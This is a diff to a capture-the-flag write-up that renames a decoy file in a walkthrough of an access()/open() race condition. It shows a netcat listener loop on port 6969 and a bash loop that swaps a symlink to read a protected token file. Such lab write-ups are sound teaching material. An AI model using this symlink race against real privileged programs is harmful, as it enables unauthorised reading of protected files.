@@ -26,7 +26,7 @@ The hardcoded port `6969` and the use of `access()` before `open()` are the two 
 The attack pattern:
 
 ```
-access("myFile")  →  myFile points to lol      [permission granted]
+access("myFile")  →  myFile points to otherFile      [permission granted]
                          ^
                          | attacker swaps symlink here
                          v
@@ -49,16 +49,16 @@ while true; do nc -l 6969; done
 
 **Terminal 2 — Symlink swapper**
 
-Rapidly alternate the symlink `myFile` between a readable file (`lol`, owned by level10) and the target (`token`, owned by flag10):
+Rapidly alternate the symlink `myFile` between a readable file (`otherFile`, owned by level10) and the target (`token`, owned by flag10):
 
 ```bash
 while true; do
-    ln -sf /home/user/level10/lol myFile
+    ln -sf /home/user/level10/otherFile myFile
     ln -sf /home/user/level10/token myFile
 done
 ```
 
-When the binary calls `access()` while the symlink points to `lol`, the check passes. If the symlink has been swapped to `token` by the time `open()` is called, the binary reads and forwards the token content.
+When the binary calls `access()` while the symlink points to `otherFile`, the check passes. If the symlink has been swapped to `token` by the time `open()` is called, the binary reads and forwards the token content.
 
 **Terminal 3 — Trigger**
 
